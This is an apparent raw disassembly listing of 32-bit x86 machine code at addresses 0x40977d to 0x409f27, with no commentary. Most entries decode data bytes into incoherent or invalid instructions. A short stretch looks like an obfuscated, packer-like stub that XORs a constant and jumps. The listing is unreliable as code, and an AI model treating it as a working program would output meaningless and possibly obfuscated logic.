  40977d:	sub    eax,0x305f8056
  409782:	inc    ebp
  409783:	out    dx,al
  409784:	push   ebp
  409785:	mov    ds:0x2d814d46,al
  40978a:	add    ecx,edx
  40978c:	dec    esi
  40978d:	or     BYTE PTR [ecx],ch
  40978f:	repnz sbb ch,BYTE PTR [ebx+0xa]
  409793:	imul   ebp,DWORD PTR [ecx-0x1dc29b51],0x1842c2af
  40979d:	outs   dx,BYTE PTR ds:[esi]
  40979e:	das    
  40979f:	sub    edi,DWORD PTR [esi+0xe]
  4097a2:	out    0xec,eax
  4097a4:	cmp    BYTE PTR [edx-0xd240380],0x82
  4097ab:	mov    esp,0x187efc30
  4097b0:	cmp    eax,0x3583b834
  4097b5:	sub    bh,BYTE PTR [edx-0x5652a83c]
  4097bb:	xchg   esi,eax
  4097bc:	inc    esp
  4097bd:	push   es
  4097be:	aad    0x7b
  4097c0:	jge    0x409766
  4097c2:	mov    eax,ds:0x624d2830
  4097c7:	sub    al,0x6d
  4097c9:	jecxz  0x4097cb
  4097cb:	mov    dl,0x4f
  4097cd:	sbb    eax,0x46352741
  4097d2:	cs dec edi
  4097d4:	mov    eax,0xa46bb3
  4097d9:	pop    ds
  4097da:	iret   
  4097db:	add    DWORD PTR [esi-0x7b5ce726],edx
  4097e1:	push   esi
  4097e2:	dec    ebp
  4097e3:	loop   0x409800
  4097e5:	jp     0x409841
  4097e7:	jge    0x409861
  4097e9:	push   0xace279c7
  4097ee:	hlt    
  4097ef:	lods   eax,DWORD PTR ds:[esi]
  4097f0:	cmc    
  4097f1:	push   cs
  4097f2:	jns    0x4097be
  4097f4:	mov    edi,?
  4097f6:	jl     0x4097fd
  4097f8:	mov    cl,0x95
  4097fa:	jo     0x409808
  4097fc:	jnp    0x4097b4
  4097fe:	adc    BYTE PTR [ecx+esi*1],al
  409801:	or     al,0xcf
  409803:	sbb    ch,BYTE PTR [esp+ebx*1]
  409806:	sbb    DWORD PTR [edi-0x65823580],esi
  40980c:	or     ah,BYTE PTR [edi]
  40980e:	xchg   ebp,eax
  40980f:	mov    ecx,0xcd1bac64
  409814:	jle    0x4097bc
  409816:	xchg   ebp,eax
  409817:	xchg   ebp,eax
  409818:	jmp    0x726610be
  40981d:	(bad)  
  40981e:	sub    al,0xcc
  409820:	xlat   BYTE PTR ds:[ebx]
  409821:	das    
  409822:	test   al,0x53
  409824:	in     eax,dx
  409825:	mov    ebx,0x9a57fc56
  40982a:	adc    dh,dh
  40982c:	xchg   esp,eax
  40982d:	scas   eax,DWORD PTR es:[edi]
  40982e:	adc    al,0xad
  409830:	scas   eax,DWORD PTR es:[edi]
  409831:	dec    ebx
  409832:	cmp    al,0xb2
  409834:	sbb    ecx,esp
  409836:	sub    dl,BYTE PTR [esi-0x2f0d6c42]
  40983c:	inc    edx
  40983d:	xchg   BYTE PTR [edx],al
  40983f:	and    eax,0x8ea0991d
  409844:	mov    al,0xca
  409846:	push   0xd15e879c
  40984b:	pop    esi
  40984c:	dec    esp
  40984d:	sbb    BYTE PTR [edi+0x1e],bh
  409850:	push   ecx
  409851:	jno    0x4098cf
  409853:	xchg   ebx,eax
  409854:	retf   0x95c3
  409857:	inc    edi
  409858:	jbe    0x409899
  40985a:	cmp    ebp,DWORD PTR [ebx+0x5129f82a]
  409860:	imul   bl
  409862:	cs ror ah,1
  409865:	in     al,dx
  409866:	ja     0x409866
  409868:	pushf  
  409869:	fist   WORD PTR [eax]
  40986b:	jp     0x40988b
  40986d:	or     ecx,DWORD PTR [ebx+0x72]
  409870:	hlt    
  409871:	pop    edi
  409872:	sub    al,0x70
  409874:	xor    edi,DWORD PTR [edx]
  409876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409877:	xchg   ecx,eax
  409878:	xchg   DWORD PTR [edx-0x79],eax
  40987b:	in     eax,0xda
  40987d:	lods   eax,DWORD PTR ds:[esi]
  40987e:	mov    ch,0xbd
  409880:	loop   0x40982f
  409882:	mov    bh,bl
  409884:	pop    ds
  409885:	xchg   DWORD PTR [ecx],ecx
  409887:	mov    bh,0x73
  409889:	nop
  40988a:	pop    eax
  40988b:	hlt    
  40988c:	dec    ecx
  40988d:	jnp    0x409877
  40988f:	ja     0x40989d
  409891:	aad    0xb1
  409893:	push   ebp
  409894:	ret    0xa254
  409897:	push   eax
  409898:	xchg   esp,eax
  409899:	test   al,0x41
  40989b:	dec    ebx
  40989c:	and    dl,BYTE PTR [edx]
  40989e:	loopne 0x409855
  4098a0:	mov    ?,ebx
  4098a2:	pop    ds
  4098a3:	std    
  4098a4:	dec    eax
  4098a5:	mov    al,0xab
  4098a7:	sub    bh,cl
  4098a9:	dec    esp
  4098aa:	xchg   ecx,eax
  4098ab:	jnp    0x409844
  4098ad:	push   ecx
  4098ae:	inc    ebp
  4098af:	retf   0x280c
  4098b2:	inc    ebp
  4098b3:	mov    dl,0x26
  4098b5:	pop    edi
  4098b6:	mov    eax,ds:0x4d155c5e
  4098bb:	popf   
  4098bc:	scas   al,BYTE PTR es:[edi]
  4098bd:	cmp    DWORD PTR cs:[edi+edx*1],ebp
  4098c1:	(bad)  
  4098c2:	ficomp WORD PTR [edi+0x76c69b23]
  4098c8:	imul   esp,DWORD PTR [ebx-0x4],0xffffffe8
  4098cc:	lods   al,BYTE PTR ds:[esi]
  4098cd:	xlat   BYTE PTR ds:[ebx]
  4098ce:	dec    edx
  4098cf:	je     0x409904
  4098d1:	aas    
  4098d2:	enter  0xa047,0x9d
  4098d6:	xor    DWORD PTR [eax-0x69],ebx
  4098d9:	retf   
  4098da:	push   ebx
  4098db:	sbb    ebp,DWORD PTR [edx+0x28]
  4098de:	loopne 0x4098ba
  4098e0:	sbb    dh,BYTE PTR [edi+0x7b180730]
  4098e6:	out    dx,eax
  4098e7:	push   DWORD PTR [ebp+0x2a]
  4098ea:	cld    
  4098eb:	inc    esp
  4098ec:	mov    ?,WORD PTR [ecx]
  4098ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ef:	cli    
  4098f0:	pop    edi
  4098f1:	push   ebx
  4098f2:	in     eax,dx
  4098f3:	mov    esi,0x3fb8e059
  4098f8:	sbb    eax,0xfa95ea56
  4098fd:	sahf   
  4098fe:	push   cs
  4098ff:	mov    ebp,0x8410a195
  409904:	fs into 
  409906:	xchg   ebp,eax
  409907:	(bad)  
  409908:	jbe    0x4098cf
  40990a:	imul   ecx,DWORD PTR [ebx-0x77],0xffffffd7
  40990e:	ret    0x1ec1
  409911:	mov    bh,0x4
  409913:	ret    0x9dac
  409916:	mov    WORD PTR [ebp+0x2b],ss
  409919:	cmp    al,BYTE PTR [ebx-0x51e89fd3]
  40991f:	push   eax
  409920:	int3   
  409921:	xor    cl,BYTE PTR [eax-0x6e79434d]
  409927:	cwde   
  409928:	shl    dl,cl
  40992a:	aad    0xcb
  40992c:	lds    eax,FWORD PTR [edx-0xd]
  40992f:	push   es
  409930:	add    edi,DWORD PTR [ebx+eax*8+0x406e4230]
  409937:	mov    eax,ds:0xe2f9372d
  40993c:	call   FWORD PTR [eax+0x2cceb35c]
  409942:	js     0x4098f0
  409944:	adc    eax,0x3dbb6a2b
  409949:	inc    eax
  40994a:	outs   dx,DWORD PTR ds:[esi]
  40994b:	adc    al,0xcf
  40994d:	dec    edi
  40994e:	std    
  40994f:	icebp  
  409950:	shl    DWORD PTR [ebx-0x2f],cl
  409953:	test   DWORD PTR [ecx+0xa22518d],edx
  409959:	out    dx,al
  40995a:	jo     0x409918
  40995c:	lods   al,BYTE PTR ds:[esi]
  40995d:	pop    ds
  40995e:	push   0xffffffb4
  409960:	add    al,0x71
  409962:	mov    ah,0x73
  409964:	xchg   ecx,eax
  409965:	cmc    
  409966:	or     al,0x21
  409968:	nop
  409969:	push   edx
  40996a:	push   edx
  40996b:	xor    al,ah
  40996d:	cmp    BYTE PTR [ebp-0x1995b54a],0x54
  409974:	test   eax,esp
  409976:	ins    BYTE PTR es:[edi],dx
  409977:	sahf   
  409978:	inc    esi
  409979:	outs   dx,DWORD PTR ds:[esi]
  40997a:	push   0xd6ec2aae
  40997f:	dec    ebp
  409980:	push   ebx
  409981:	push   es
  409982:	(bad)  
  409983:	sub    BYTE PTR [edi+0x2ddb25fd],dh
  409989:	push   0x27deb004
  40998e:	xor    eax,0x70cbbf85
  409993:	add    ebx,DWORD PTR [eax+0x78]
  409996:	addr16 aam 0x1
  409999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40999a:	sbb    cl,bl
  40999c:	adc    DWORD PTR [ebp+0x4825cb6f],0xdba4b05b
  4099a6:	out    0x15,al
  4099a8:	test   DWORD PTR [edi+0x76b5557a],edi
  4099ae:	and    al,0x5c
  4099b0:	mov    al,BYTE PTR [ebx]
  4099b2:	iret   
  4099b3:	xchg   esi,eax
  4099b4:	(bad)  
  4099b5:	push   ds
  4099b6:	mov    bl,0x32
  4099b8:	popa   
  4099b9:	xchg   ecx,eax
  4099ba:	clc    
  4099bb:	mov    bl,0xc
  4099bd:	jae    0x409a28
  4099bf:	inc    eax
  4099c0:	sub    BYTE PTR [edx-0x36],bh
  4099c3:	out    dx,eax
  4099c4:	adc    eax,0x8cd6e2fe
  4099c9:	lock leave 
  4099cb:	in     al,0xb4
  4099cd:	stos   DWORD PTR es:[edi],eax
  4099ce:	nop
  4099cf:	lea    esi,[edi+0x54]
  4099d2:	in     eax,dx
  4099d3:	stos   BYTE PTR es:[edi],al
  4099d4:	call   0xe757:0x4e637760
  4099db:	jae    0x409a0c
  4099dd:	outs   dx,DWORD PTR ds:[esi]
  4099de:	imul   ebx,ebx,0x28fca282
  4099e4:	xchg   edi,eax
  4099e5:	call   0x4917:0x74081d7b
  4099ec:	shl    DWORD PTR [edx+0x58],cl
  4099ef:	les    esi,FWORD PTR [ecx-0x63fb846b]
  4099f5:	les    ecx,FWORD PTR [eax+0x52eb85bf]
  4099fb:	adc    DWORD PTR [esi-0x6b],edi
  4099fe:	(bad)  
  4099ff:	loop   0x40999b
  409a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a02:	shl    esp,0xb0
  409a05:	and    DWORD PTR [eax-0x54],0x4a
  409a09:	je     0x40999f
  409a0b:	push   es
  409a0c:	cld    
  409a0d:	xchg   ebx,eax
  409a0e:	ldmxcsr DWORD PTR [edi-0x3]
  409a12:	daa    
  409a13:	inc    esp
  409a14:	mov    ds,WORD PTR [eax+ebp*8]
  409a17:	out    0xaa,eax
  409a19:	inc    ebp
  409a1a:	cld    
  409a1b:	aaa    
  409a1c:	int3   
  409a1d:	shl    bl,cl
  409a1f:	inc    DWORD PTR [ebp+0x7c]
  409a22:	dec    esi
  409a23:	sbb    BYTE PTR [esi],dh
  409a25:	sti    
  409a26:	stc    
  409a27:	xchg   ebx,eax
  409a28:	inc    edi
  409a29:	test   BYTE PTR [eax],0x17
  409a2c:	mov    ch,0xe5
  409a2e:	aam    0x73
  409a30:	xor    al,0xee
  409a32:	push   cs
  409a33:	xchg   ebx,eax
  409a34:	test   DWORD PTR [ebp-0x193af97f],0x12faae93
  409a3e:	push   0xffffffc9
  409a40:	pop    eax
  409a41:	or     DWORD PTR [edi+0x6d],edi
  409a44:	jl     0x4099f0
  409a46:	test   al,0xdb
  409a48:	shr    dl,1
  409a4a:	test   DWORD PTR ss:[esi],esp
  409a4d:	push   edi
  409a4e:	mov    ch,0x4f
  409a50:	jmpw   0xfb14
  409a54:	cmc    
  409a55:	add    BYTE PTR [edx+0x33],0x1e
  409a59:	inc    esp
  409a5a:	sets   BYTE PTR [esp+eax*8+0x6b60c7c6]
  409a62:	imul   ebp,esi,0xffffffbb
  409a65:	daa    
  409a66:	dec    ecx
  409a67:	test   ch,al
  409a69:	loop   0x409a3f
  409a6b:	push   0x56
  409a6d:	xchg   ecx,eax
  409a6e:	mov    esi,0x86567520
  409a73:	fcom   st(7)
  409a75:	jno    0x409a3a
  409a77:	xor    ch,BYTE PTR [ecx]
  409a79:	jp     0x409aac
  409a7b:	dec    edi
  409a7c:	mov    al,ds:0xfbbcde89
  409a81:	mov    ds:0x735293a,al
  409a86:	cmp    al,0x21
  409a88:	push   esp
  409a89:	ja     0x409a5f
  409a8b:	outs   dx,BYTE PTR ds:[esi]
  409a8c:	add    ecx,DWORD PTR [esi-0x12]
  409a8f:	cwde   
  409a90:	adc    DWORD PTR [esi-0x9efb8cd],0xffffffe3
  409a97:	xchg   dh,bl
  409a99:	adc    edi,DWORD PTR [eax-0xeb76797]
  409a9f:	mov    eax,esi
  409aa1:	push   ebp
  409aa2:	mov    gs,ebx
  409aa4:	dec    ecx
  409aa5:	test   al,0x74
  409aa7:	push   edx
  409aa8:	mov    esi,0x25c18cef
  409aad:	lea    esi,[ebp+0x65]
  409ab0:	cmp    ebp,esi
  409ab2:	test   eax,0x73a65731
  409ab7:	jecxz  0x409b0f
  409ab9:	mov    ecx,DWORD PTR ds:0x422008
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409b7e
  409b48:	mov    dh,0xbc
  409b4a:	cdq    
  409b4b:	cmp    DWORD PTR [edx+edi*2],eax
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	jecxz  0x409b36
  409b55:	jae    0x409af3
  409b57:	pop    ss
  409b58:	cli    
  409b59:	and    BYTE PTR [esi],cl
  409b5b:	stos   BYTE PTR es:[edi],al
  409b5c:	inc    eax
  409b5d:	push   edi
  409b5e:	pop    esi
  409b5f:	or     ecx,esi
  409b61:	fwait
  409b62:	int    0x39
  409b64:	cmp    DWORD PTR [eax-0x29c40907],edi
  409b6a:	adc    cl,BYTE PTR [edi]
  409b6c:	and    BYTE PTR [ebx+ebp*4-0x4c],0x60
  409b71:	or     DWORD PTR [edi+0x4],eax
  409b74:	stos   BYTE PTR es:[edi],al
  409b75:	outs   dx,BYTE PTR ds:[esi]
  409b76:	(bad)  [edi]
  409b78:	sbb    eax,0xd7427cd9
  409b7d:	mov    bh,0xa0
  409b7f:	jbe    0x409b1f
  409b81:	les    edx,FWORD PTR [ecx-0x66]
  409b84:	mov    bh,0xfe
  409b86:	mov    ds:0x51e0fc81,al
  409b8b:	orps   xmm5,xmm4
  409b8e:	fst    QWORD PTR [edi]
  409b90:	sbb    BYTE PTR [edi],cl
  409b92:	out    dx,al
  409b93:	in     eax,dx
  409b94:	pushf  
  409b95:	mov    edx,0x1a667873
  409b9a:	loope  0x409bfb
  409b9c:	(bad)  
  409b9d:	(bad)  
  409b9e:	jnp    0x409b6b
  409ba0:	jne    0x409b74
  409ba2:	xor    BYTE PTR [edi-0x75],bl
  409ba5:	scas   al,BYTE PTR es:[edi]
  409ba6:	xchg   esi,eax
  409ba7:	push   edi
  409ba8:	jge    0x409b98
  409baa:	sahf   
  409bab:	rcl    ah,0x14
  409bae:	pop    ds
  409baf:	mov    ah,BYTE PTR [ebx+ecx*1-0x3f]
  409bb3:	xor    al,BYTE PTR [edx+0x2dfb9b17]
  409bb9:	gs xchg ebx,ebp
  409bbc:	sbb    BYTE PTR [ebx+0x1b818c73],ah
  409bc2:	jae    0x409c0e
  409bc4:	adc    ebp,DWORD PTR [ebx]
  409bc6:	cmp    BYTE PTR [ebp+0x3ed38a20],0x5
  409bcd:	ror    esp,cl
  409bcf:	outs   dx,DWORD PTR ds:[esi]
  409bd0:	cmp    ecx,edi
  409bd2:	push   ecx
  409bd3:	jmp    0x30e0:0xfed1d39e
  409bda:	and    edx,DWORD PTR [ecx-0x3c]
  409bdd:	dec    ebx
  409bde:	or     DWORD PTR [ecx],edi
  409be0:	mov    WORD PTR [esi],?
  409be2:	mov    esi,0xa08d3e2a
  409be7:	push   ecx
  409be8:	sbb    DWORD PTR [edi-0x65],edi
  409beb:	dec    ebp
  409bec:	dec    ecx
  409bed:	adc    BYTE PTR [ebp-0x30],ch
  409bf0:	lods   eax,DWORD PTR ds:[esi]
  409bf1:	in     eax,dx
  409bf2:	xlat   BYTE PTR ds:[ebx]
  409bf3:	cmp    eax,edx
  409bf5:	repnz cdq 
  409bf7:	gs push 0x30
  409bfa:	pop    ds
  409bfb:	xor    edi,0x2a
  409bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bff:	mov    esp,0x2efef210
  409c04:	push   ecx
  409c05:	loopne 0x409c11
  409c07:	mov    WORD PTR [ecx-0x6d2a4194],fs
  409c0d:	sub    al,0xe4
  409c0f:	repz inc ebx
  409c11:	pop    esi
  409c12:	mov    al,0xdf
  409c14:	xchg   edi,eax
  409c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c16:	lods   eax,DWORD PTR ds:[esi]
  409c17:	inc    edx
  409c18:	or     al,0xf5
  409c1a:	jo     0x409c3f
  409c1c:	xchg   ebp,eax
  409c1d:	bound  ecx,QWORD PTR [esi+esi*2+0x604cfa5e]
  409c24:	or     eax,0x97e9ebb2
  409c29:	mov    bh,0x9c
  409c2b:	add    BYTE PTR [esi],cl
  409c2d:	loop   0x409bfd
  409c2f:	ja     0x409bc0
  409c31:	xchg   BYTE PTR [ebx+edi*2+0x79],dh
  409c35:	aaa    
  409c36:	shl    DWORD PTR [ebp+0x1e4a440d],cl
  409c3c:	pop    edx
  409c3d:	xor    ch,BYTE PTR [ebp-0x30b0a0ec]
  409c43:	dec    edx
  409c44:	dec    ecx
  409c45:	cmp    BYTE PTR [esi+ebx*4],dh
  409c48:	retf   
  409c49:	push   edi
  409c4a:	inc    edi
  409c4b:	inc    esp
  409c4c:	pop    esi
  409c4d:	push   ss
  409c4e:	call   0x7baa:0x5bca7c56
  409c55:	sbb    bh,BYTE PTR [edi]
  409c57:	out    dx,eax
  409c58:	jb     0x409c95
  409c5a:	(bad)  
  409c5b:	rcr    al,1
  409c5d:	add    eax,0x30bb6fd6
  409c62:	pop    edx
  409c63:	addr16 mov eax,ds:0x674e
  409c67:	ftst   
  409c69:	mov    ah,BYTE PTR [edx+eiz*8]
  409c6c:	cmp    eax,0x97136535
  409c71:	out    0x4c,al
  409c73:	mov    ch,0x32
  409c75:	and    bl,dh
  409c77:	out    dx,al
  409c78:	pop    ds
  409c79:	retf   
  409c7a:	sbb    eax,0x1c7b32c5
  409c7f:	mov    ?,WORD PTR [esi-0x35]
  409c82:	into   
  409c83:	movzx  esi,BYTE PTR [ecx]
  409c86:	sub    eax,0xff8fdd63
  409c8b:	sbb    dh,bl
  409c8d:	dec    edi
  409c8e:	test   eax,0xa7307dc
  409c93:	jns    0x409c2e
  409c95:	jge    0x409d0d
  409c97:	sbb    eax,0x60f1dfc1
  409c9c:	idiv   edx
  409c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c9f:	jbe    0x409ca5
  409ca1:	scas   al,BYTE PTR es:[edi]
  409ca2:	xor    al,0x36
  409ca4:	push   edx
  409ca5:	mov    ch,0xcf
  409ca7:	jne    0x409cc6
  409ca9:	in     eax,dx
  409caa:	add    eax,0x946bfd3
  409caf:	test   DWORD PTR ds:0x531bbb32,esp
  409cb5:	fisub  WORD PTR [edx+0x6e4eff1a]
  409cbb:	xchg   DWORD PTR [edi],esi
  409cbd:	xchg   ebp,edx
  409cbf:	adc    eax,0xb444ff9a
  409cc4:	fs cli 
  409cc6:	mov    ebx,0x5b075828
  409ccb:	ins    BYTE PTR es:[edi],dx
  409ccc:	ins    DWORD PTR es:[edi],dx
  409ccd:	call   0x4f437597
  409cd2:	leave  
  409cd3:	out    dx,eax
  409cd4:	lds    ecx,FWORD PTR ss:[ecx+0x15]
  409cd8:	jbe    0x409ced
  409cda:	ror    ch,cl
  409cdc:	or     BYTE PTR [esi],dh
  409cde:	scas   al,BYTE PTR es:[edi]
  409cdf:	ret    0x8da7
  409ce2:	ror    bl,1
  409ce4:	mov    bl,0x31
  409ce6:	outs   dx,DWORD PTR ds:[esi]
  409ce7:	arpl   WORD PTR [eax-0xb],bx
  409cea:	rcl    BYTE PTR [ebp+eax*1-0xd],cl
  409cee:	mov    ds:0x15e154d3,eax
  409cf3:	(bad)  
  409cf4:	rcr    BYTE PTR [ebp+ebp*2+0x1b],1
  409cf8:	adc    DWORD PTR [ecx-0x72],esi
  409cfb:	mov    ecx,0x65b66f79
  409d00:	(bad)  
  409d01:	iret   
  409d02:	jp     0x409ce6
  409d04:	add    bl,al
  409d06:	mov    ecx,0x794745f3
  409d0b:	or     DWORD PTR [eax+0x115db7d3],eax
  409d11:	cmc    
  409d12:	adc    BYTE PTR [ebp-0x61],0xb7
  409d16:	clc    
  409d17:	int3   
  409d18:	jp     0x409d75
  409d1a:	inc    edi
  409d1b:	push   edx
  409d1c:	sbb    dh,BYTE PTR [eax+eiz*8]
  409d1f:	dec    esp
  409d20:	add    dl,0x73
  409d23:	out    0x1c,al
  409d25:	cli    
  409d26:	adc    esi,DWORD PTR [edi+0x3ddc8f84]
  409d2c:	mov    ecx,DWORD PTR [eax+0x48168c49]
  409d32:	push   esp
  409d33:	jl     0x409d97
  409d35:	mov    ebp,0x6ba9a4b9
  409d3a:	int    0x41
  409d3c:	xlat   BYTE PTR ds:[ebx]
  409d3d:	fld    DWORD PTR [ecx+0x7971783d]
  409d43:	mov    cl,0x9f
  409d45:	call   0xdb827f23
  409d4a:	or     al,0xa6
  409d4c:	pop    ecx
  409d4d:	mov    edx,0x1325126d
  409d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d53:	push   esp
  409d54:	inc    edx
  409d55:	(bad)  
  409d56:	or     al,0xbc
  409d58:	mul    BYTE PTR [esi-0x9dfb7c9]
  409d5e:	inc    BYTE PTR [edi-0x3334beaf]
  409d64:	add    BYTE PTR [edx+0x732d56b6],ah
  409d6a:	xchg   esi,eax
  409d6b:	adc    cl,BYTE PTR [ebp-0x167efe4c]
  409d71:	test   eax,0x587a8dac
  409d76:	in     eax,dx
  409d77:	jle    0x409d60
  409d79:	scas   eax,DWORD PTR es:[edi]
  409d7a:	aaa    
  409d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7c:	pop    eax
  409d7d:	into   
  409d7e:	mov    cl,0xf6
  409d80:	mov    ebx,0xa6543b84
  409d85:	out    dx,eax
  409d86:	push   0xffffffdc
  409d88:	mov    ebx,0xcb638424
  409d8d:	scas   eax,DWORD PTR es:[edi]
  409d8e:	add    DWORD PTR [eax+0x79],edx
  409d91:	ds stos BYTE PTR es:[edi],al
  409d93:	mov    esp,0x4a40f0ff
  409d98:	and    al,0x96
  409d9a:	aad    0x7
  409d9c:	in     al,dx
  409d9d:	pop    ebp
  409d9e:	mov    dh,0x9f
  409da0:	inc    ebp
  409da1:	fisttp WORD PTR [esi-0xe6c6e2]
  409da7:	retf   0xcb4f
  409daa:	and    ch,bh
  409dac:	mov    edi,es
  409dae:	dec    esp
  409daf:	nop
  409db0:	jb     0x409d5d
  409db2:	mov    edx,0xae6a9e38
  409db7:	mov    ch,0x3d
  409db9:	mov    eax,ds:0xcf4ea58e
  409dbe:	mov    esp,0x4c36313a
  409dc3:	mov    al,ds:0x7ca3b6d3
  409dc8:	adc    al,0x6f
  409dca:	mov    edi,0x6a04c6d5
  409dcf:	aaa    
  409dd0:	push   0xdc4d5af5
  409dd5:	repnz push esp
  409dd7:	jge    0x409e36
  409dd9:	sbb    eax,0xb89d6551
  409ddf:	fimul  WORD PTR [edx-0x26]
  409de2:	pop    esi
  409de3:	dec    ebx
  409de4:	add    DWORD PTR [ebp+0x3d],edx
  409de7:	push   ebp
  409de9:	sbb    BYTE PTR [esi+edx*4+0x57bf4a02],dh
  409df0:	xchg   edx,eax
  409df1:	(bad)  
  409df2:	or     cl,dh
  409df4:	sub    bl,BYTE PTR [edi]
  409df6:	jmp    edx
  409df8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409df9:	fcom   DWORD PTR gs:[ebx]
  409dfc:	jne    0x409e1f
  409dfe:	xchg   esp,eax
  409dff:	nop
  409e00:	cmp    edx,DWORD PTR [edx+ebp*1]
  409e03:	js     0x409e81
  409e05:	fsubr  st,st(7)
  409e07:	push   0x396786cf
  409e0c:	mov    edx,0x8e233d66
  409e11:	enter  0xc49c,0x4c
  409e15:	and    eax,0x5859828c
  409e1a:	ja     0x409e32
  409e1c:	scas   al,BYTE PTR es:[edi]
  409e1d:	mov    cl,0x69
  409e1f:	pop    ss
  409e20:	jnp    0x409e38
  409e22:	sub    eax,DWORD PTR [edi+0x6601ef74]
  409e28:	push   ecx
  409e29:	mov    ds,WORD PTR [ebx]
  409e2b:	inc    ebx
  409e2c:	(bad)  
  409e2d:	in     eax,0x9a
  409e2f:	push   0xfb048d3c
  409e34:	sbb    edx,DWORD PTR [eax-0x637a4a86]
  409e3a:	lea    ebx,[edi+0x438d9502]
  409e40:	push   ds
  409e41:	mov    bh,0xc3
  409e43:	pop    edi
  409e44:	inc    ebx
  409e45:	shl    DWORD PTR [eax+edi*8+0x1e704111],cl
  409e4c:	imul   ebp,esp,0x74
  409e4f:	leave  
  409e50:	in     eax,dx
  409e51:	out    0x1a,al
  409e53:	data16 and al,0xba
  409e56:	popf   
  409e57:	outs   dx,BYTE PTR ds:[esi]
  409e58:	pop    es
  409e59:	inc    edx
  409e5a:	push   ss
  409e5b:	xor    ebp,DWORD PTR [ecx-0x66]
  409e5e:	mov    eax,0x725d556e
  409e63:	jle    0x409e54
  409e65:	(bad)  
  409e66:	loopne 0x409edb
  409e68:	sub    DWORD PTR [ebp+0x19d560d6],ecx
  409e6e:	int    0xae
  409e70:	and    dh,BYTE PTR [esi+0x4eb6258b]
  409e76:	sbb    al,0xc7
  409e78:	adc    eax,0xa8dcb804
  409e7d:	mov    dl,0xa9
  409e7f:	xchg   esi,eax
  409e80:	push   esp
  409e81:	fisttp QWORD PTR es:[ebx+0x7a]
  409e85:	mov    ebx,0x9a1308b4
  409e8a:	ja     0x409e8f
  409e8c:	jnp    0x409ee0
  409e8e:	jmp    0xf040:0xd802a538
  409e95:	sbb    eax,0x49dff9d0
  409e9a:	fsubr  DWORD PTR [esi]
  409e9c:	out    0xd5,eax
  409e9e:	inc    ebx
  409e9f:	outs   dx,BYTE PTR ds:[esi]
  409ea0:	push   ss
  409ea1:	inc    esp
  409ea2:	fadd   st,st(0)
  409ea4:	push   ds
  409ea5:	pusha  
  409ea6:	es jg  0x409ee2
  409ea9:	jecxz  0x409e5a
  409eab:	xor    ah,BYTE PTR [edx+0x19]
  409eae:	push   cs
  409eaf:	ret    
  409eb0:	add    BYTE PTR [ecx],0x6
  409eb3:	loope  0x409f15
  409eb5:	call   0x4924f761
  409eba:	adc    al,0x46
  409ebc:	mov    esi,DWORD PTR es:[edx-0x6cad2961]
  409ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ec4:	mov    WORD PTR [eax],fs
  409ec6:	add    eax,0x14237c66
  409ecb:	clc    
  409ecc:	fisubr DWORD PTR [eax]
  409ece:	xor    DWORD PTR ds:0x6f6a1240,0xffffffc3
  409ed5:	in     eax,dx
  409ed6:	jmp    0x6779:0xd01f39ef
  409edd:	mov    edx,0x9dd30cdd
  409ee2:	lahf   
  409ee3:	mov    ebp,0xb46286ca
  409ee8:	push   ds
  409ee9:	and    edx,ebx
  409eeb:	pushf  
  409eec:	int3   
  409eed:	pop    ebx
  409eee:	push   ds
  409eef:	out    0x27,al
  409ef1:	div    DWORD PTR [eax]
  409ef3:	dec    edi
  409ef4:	xchg   ebp,eax
  409ef5:	mov    WORD PTR [edi-0x4c],es
  409ef8:	scas   eax,DWORD PTR es:[edi]
  409ef9:	outs   dx,BYTE PTR ds:[esi]
  409efa:	add    al,0xe7
  409efc:	xchg   esi,eax
  409efd:	xor    edi,DWORD PTR [ecx-0x65af7711]
  409f03:	pop    edx
  409f04:	gs mov edx,0x9db15ae2
  409f0a:	add    ebp,DWORD PTR [ebx]
  409f0c:	adc    dl,dl
  409f0e:	cwde   
  409f0f:	int    0x5a
  409f11:	push   0x6edb4477
  409f16:	ror    DWORD PTR [eax],cl
  409f18:	sub    eax,esi
  409f1a:	leave  
  409f1b:	xor    ah,0x37
  409f1e:	call   0x5b5bdfc2
  409f23:	pop    edi
  409f24:	imul   ebx,esi,0xffffff93
  409f27:	jno    0x409f90
